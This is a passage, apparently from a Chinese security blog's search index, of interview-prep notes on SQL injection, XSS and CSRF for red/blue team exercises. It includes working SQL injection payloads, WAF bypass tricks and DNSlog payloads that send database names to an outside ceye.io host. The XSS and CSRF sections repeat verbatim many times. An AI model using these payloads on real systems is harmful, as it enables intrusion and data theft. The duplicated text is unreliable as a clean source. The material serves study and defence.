代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。 5.报错注入的函数有哪些？ extractvalue(1, concat(0x5c,(select user()))) updatexml(0x3a,concat(1,(select user())),1) exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b)) GTID_SUBSET(version(), 1) **SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如： SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1); **LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如： SELECT LENGTH((SELECT username from users WHERE id=1)); **ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如： SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1)); 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。 （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。 （3）Mysql 中利用 load_file() 构造payload ’ and if((select load_file(concat(’\\’,(select database()),’.xxx.ceye.io\\abc’))),1,0)# （4）Mssql 下利用 master..xp_dirtree 构造payload DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree\"'+@host+'\\foobar$\"'); 7.SQL注入时 and or 被过滤怎办？1.大小写变形 2.编码 3.添加注释 4.双写法 5.利用符号形式 6.浮点数 #数字被注释 7.函数替代 #符号被注释 8.SQL注入过滤逗号如何处理在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决: select substr(database() from 1 for 1); select mid(database() from 1 for 1); 使用join： union select 1,2 #等价于 union select * from (select 1)a join (select 2)b 使用like： select ascii(mid(user(),1,1))=80 #等价于 select user() like 'r%' 对于limit可以使用offset来绕过： select * from news limit 0,1 # 等价于下面这条SQL语句 select * from news limit 1 offset 0 select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97); 127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)# select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end # substring((select password from mysql.user where user='root') from -1）='e' 原文：https://blog.csdn.net/nzjdsds/article/details/81322529 https://www.jianshu.com/p/d10785d22db2 9.sql 注入绕过 WAF的 方法？白盒 根据waf的固定规则去寻找有没有漏网之鱼. 黑盒 架构层绕waf 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入. 协议层面绕过waf 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过 参数污染 有的waf仅对部分内容进行过滤如 规则层面绕过 1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct 2.注释绕过，如 /*!select*/，/**/，/*!*/，/*!12345*/，# 3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字） 4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF 5.参数绕过，复制参数，id=1\u0026id=1 6.组合法 如 and 可以用\u0026\u0026再 URL 编码 7.替换法，如 and 改成\u0026\u0026;=可以用 like 或 in 等 8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感） 9.多重关键字绕过如ununion","date":"2023-11-17","objectID":"/hvv_owasptop10/:0:1","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#18mysql-在渗透测试中的利用"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#02-xss漏洞"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-1"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2分类-1"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#3危害"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#4防御"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#5如何快速判定xss类型"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6存储型xss怎么利用"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7cors浏览器同源策略"},{"categories":["hvv"],"content":"\r02-xss漏洞\r1.原理XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。 2.分类：反射型XSS 储存型XSS DOM XSS 3.危害​ 1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。 ​ 2.攻击者能够在一定限度内记录用户的键盘输入。 ​ 3.攻击者通过CSRF等方式以用户身份执行危险操作。 ​ 4.XSS蠕虫。 ​ 5.获取用户浏览器信息。 ​ 6.利用XSS漏洞扫描用户内网。 4.防御：**总体思路:**对用户输入进行过滤,对输出进行编码 1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全; 黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' \" \u003c\u003e 等进行过滤 白名单:只定义哪些数据正常才能被提交; 2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过) 3.使用一些函数进行防御 4.不要随意打开一些来历不明的网站或链接 5.如何快速判定XSS类型？存储型XSS： 发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码； 反射型XSS： 发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码； DOM型XSS： 发送一次带XSS代码的请求，在返回包里没有XSS代码； 6.存储型XSS怎么利用XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 7.CORS（浏览器同源策略）js =\u003eajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 8.XSS绕过waf总结 Script 标签 JavaScript 事件 行内样式(Inlinestyle) CSS import Javascript URL 利用字符编码 绕过长度限制 超文本内容 变形主要包含大小写和JavaScript变形 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:1:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#8xss绕过waf总结"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#03-csrf漏洞"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#1原理-2"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 3.如何防止 CSRF?1.验证 referer 2.验证 token 4.csrf成功利用的条件1- 用户在统一浏览器下 2- 没有关闭浏览器的情况下 3- 访问了攻击者精心伪装好的恶意链接 5.XSS和CSRF的区别 xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站 xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能 CSRF比XSS漏洞危害更高。 CSRF可以做到的事情，XSS都可以做到。 XSS有局限性，而CSRF没有局限性。 XSS针对客户端，而CSRF针对服务端。 XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。 ","date":"2023-11-17","objectID":"/hvv_owasptop10/:2:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#2形成原因"},{"categories":["hvv"],"content":"\r03-csrf漏洞\r1.原理：​ 当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击 2.形成原因：​ 主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload 